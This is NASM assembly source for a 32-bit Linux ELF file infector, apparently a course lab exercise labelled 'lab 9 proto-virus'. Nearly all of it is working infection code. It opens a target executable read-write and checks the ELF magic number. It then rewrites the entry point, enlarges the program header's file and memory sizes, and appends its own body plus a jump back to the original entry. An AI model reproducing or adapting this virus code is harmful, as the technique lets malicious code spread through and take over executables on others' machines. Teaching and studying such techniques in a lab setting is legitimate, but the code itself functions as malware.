%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; STK_RES Set up ebp and reserve space on the stack for local storage



; 1. Print a message to stdout, something like "This is a virus".

infection:                  ; print the message "Hello, This is a virus"
 	
 	call get_my_loc
 	sub ecx,next_i-msg
 	write 1,ecx,23

; 2. Open an ELF file with a given constant name "ELFexec". The open mode should be RDWR, rather than APPEND.
infector:


	;insert check


    ;get first argument - file name to open. infector (char* ). 8,4, byte 1 (0) 
    mov dword [ebp-8],"ELFe"
    mov dword [ebp-4],"xec"
    mov byte [ebp-1],0
    mov ebx,ebp
    sub ebx,8
    call get_my_loc
 	sub ecx,next_i-FileName
 	mov ebx, ecx
    mov ecx,0
    mov ecx,RDWR
    mov edx,0
    mov edx, 0777           ;permits for file.
    E:
    open ebx,ecx,edx


    mov [ebp-4], eax  ;save file descripter

    E1:
  	cmp eax,1
  	jge OK
 
 	ERRORLBL: 
  	call get_my_loc
 	sub ecx, next_i - error
 	jmp ecx
 
 	OK:
; e - 45. l - 4c. f - 46.
; 3. Check that the open succeeded, and that this is an ELF file using its magic number.
	mov ecx,[ebp-8]
	read eax, ecx,4
 	cmp byte [ebp-8],'E'
	jne error 

	cmp byte [ebp-7],'L'
	jne error 

	cmp byte [ebp-6],'F'
	jne error 

;TASK 1 STUFF. ;elf header size = 52. 
; A. Code to copy the ELF header into memory (on the stack). Do not forget to make sure that sufficient local storage is allocated on the stack before doing so.
D: 

	mov eax,[ebp-4]
	lseek eax, 0, SEEK_SET
	
	mov eax,[ebp-4]
	lseek eax, 0, SEEK_END

	Len:
 	mov esi,eax ;Discovered length, into esi 

 	mov eax,[ebp-4]
	lseek eax, 0, SEEK_SET
DD: 
    mov eax,[ebp-4]

    sub ebp,136
    mov ecx,0
    mov ecx,ebp 
    read eax, ecx, 116 ;Read data into ecx. [Elf header] 0-52 ElfHeader. 52-84.
	mov edi,ecx
	Yo:
	mov esi, edi
	add esi,52d
	mov edx,esi
	add edx,32d
	;represend. [ebp-4] - fileDescriptor. [ebp-8] = ph_hdr[1].offset. [ebp-12] = originalFileSize. 
	;[ebp-16] = ph_hdr[1].v_addr. [ebp-20] = virus_size
	Yo2:
	mov eax,edx
	add eax,4 ;offset
	;mov eax, edx+8
	Yo3:
	mov ebx,0
	mov ebx, dword [eax]
	mov dword [ebp-8], ebx
	mov dword [ebp-12], 4080d
	mov eax,0
	mov eax, edx
	add eax,8
	mov ebx,0
	mov ebx, dword [eax]
	mov dword [ebp-16], ebx
	mov dword [ebp-20], PreviousEntryPoint-_start

	mov eax,[ebp-4]
	lseek eax, 0, SEEK_SET

SAVEOLDENTRY:
	mov ecx,edi
	mov esi, dword [edi+24]
	mov edi,esi

; B. Code to modify the copy of the ELF header of ELFexec that resides in memory, updating the entry point to the first instruction of your virus. Note that this must be the place it resides in memory when the infected ELF file is executed, and not the first instruction in the currently executing virus. In order to find the address to which this file loads to in main memory, you need data from the first program header. At this point you may find its value using readelf and plug it into your code as a constant value.
	;change the entry point to.
 
UpdateEntryPoint:
	mov edx,0
	mov edx, dword [ebp-16]
	mov eax,0
	mov eax, dword [ebp-12]
	add edx, eax
	mov eax, 0
	mov eax, dword [ebp-8] 
	sub edx, eax  ;new entry point = ph_hdr[1].v_addr (ebp-16) + originalFileSize (ebp-12) - ph_hdr[1].offset (ebp-8)	
	BEFORE:
 	mov dword [ecx+18h],edx ;updating the entry point 
	WRITE:
	add ebp,136
	mov esi,ecx
	mov eax,[ebp-4]
	lseek eax, 0, SEEK_SET
	mov ecx,esi
	mov ebx,[ebp-4] ;ebx holds fileDescriptor
	write ebx,ecx,52	     ;write to file


	UpdateFields:
	sub ebp,136
	mov eax, dword [ebp-12] ; eax = originalFileSize
	mov ebx,0
	mov ebx, dword [ebp-8] ; ebx = ph_hdr[1].offset
	sub eax, ebx
	mov ebx,0
	mov ebx, dword [ebp-20] ; ebx = virus_size
 	add eax, ebx ; memsize = filesize = vir_offset - ph_hdr[1].offset + virus_size = memsize/filesize + virus_size
 	Creation:
	mov esi,eax
	add ebp,136 

	FirstUpdate:
	mov ebx,[ebp-4]
 	lseek ebx, 100, SEEK_SET
	mov ecx,ebp
	sub ecx, 200
	mov dword [ecx],0
	mov dword [ecx],esi
 	write ebx , ecx, 4 

	SecondUpdate: 
	mov ebx,[ebp-4]
 	lseek ebx, 104, SEEK_SET
	mov ecx,ebp
	sub ecx, 204
	mov dword [ecx],0
	mov dword [ecx],esi
 	write ebx , ecx, 4 

 	mov eax,[ebp-4]
	lseek eax, 0, SEEK_END
   
    DDDD: 
    call get_my_loc
 	sub ecx,next_i-_start
    mov ebx,[ebp-4]
    mov edx, PreviousEntryPoint-_start
    sizeIs:
	write ebx,ecx,edx	     ;write to file

 	ADDITION: 
 	mov ebx,[ebp-4]	;eax holds fileDescriptor. seek last 4 bytes.
	lseek ebx, 0, SEEK_END
	
	mov ebx,[ebp-4] ; 	;writing 4 last bytes: entry point 
	PASS: ;make ecx a pointer to previousEntryPoint
	mov ecx,ebp
	sub ecx, 60
	mov dword [ecx],edi
	write ebx , ecx, 4 
	
	mov ebx, [ebp-4]
	close ebx 
	add ebp,4
    
    call get_my_loc
 	add ecx,PreviousEntryPoint-next_i ;ecx points to next_i. Needs to add the offset between next_i and PreviousEntryPoint
 	jmp dword [ecx] ;now ecx points to PreviousEntryPoint
       
 
VirusExit:  
	exit 0
 
error: ;If error, exit
	call get_my_loc
 	sub ecx,next_i-errorMsg ;ecx holds errorMessage
 	write 1,ecx,22
   
    call get_my_loc
 	add ecx,PreviousEntryPoint-next_i ;ecx points to next_i. Needs to add the offset between next_i and PreviousEntryPoint
 	jmp dword [ecx] ;now ecx points to PreviousEntryPoint

msg: db "Hello, This is a virus",10,0 ;this is our message
errorMsg: db "Error on file opening",10,0 ;this is our message
virusMsg: db "Virus exited successfully",10,0 ;this is our message

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	


get_my_loc:

	call next_i

next_i: 
	pop ecx
	ret 
virus_end:

PreviousEntryPoint: dd VirusExit ;0x08048080